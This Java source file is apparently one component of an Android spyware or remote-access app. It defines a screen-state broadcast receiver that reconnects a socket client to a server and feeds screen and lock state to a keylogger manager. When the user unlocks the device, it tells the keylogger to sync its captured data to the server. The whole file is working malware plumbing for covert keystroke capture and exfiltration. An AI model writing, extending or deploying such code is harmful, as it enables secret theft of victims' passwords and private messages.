package com.fason.app.receiver;

import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import com.fason.app.core.network.SocketClient;
import com.fason.app.features.keylogger.KeyloggerManager;

public class ScreenStateReceiver extends BroadcastReceiver {
    private static final String TAG = "ScreenState";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;
        switch (intent.getAction()) {
            case Intent.ACTION_SCREEN_ON:
                Log.d(TAG, "Screen on");
                SocketClient client = SocketClient.getInstance();
                if (client != null) {
                    client.reconnect();
                }
                notifyKeyloggerScreenState(context, true);
                break;
            case Intent.ACTION_SCREEN_OFF:
                Log.d(TAG, "Screen OFF");
                notifyKeyloggerScreenState(context, false);
                break;
            case Intent.ACTION_USER_PRESENT:
                Log.d(TAG, "User present");
                KeyloggerManager kl = KeyloggerManager.getInstance();
                if (kl != null && kl.isActive()) {
                    kl.onScreenStateChanged(true, false);
                    kl.syncToServer();
                }
                break;
        }
    }

    private void notifyKeyloggerScreenState(Context context, boolean screenOn) {
        KeyloggerManager kl = KeyloggerManager.getInstance();
        if (kl == null || !kl.isActive()) return;
        boolean locked = false;
        try {
            KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
            if (km != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    locked = km.isDeviceLocked();
                } else {
                    locked = km.isKeyguardLocked();
                }
            }
        } catch (Exception ignored) {}
        if (screenOn) {
            kl.onScreenStateChanged(true, locked);
        } else {
            kl.onScreenStateChanged(false, true);
        }
    }
}
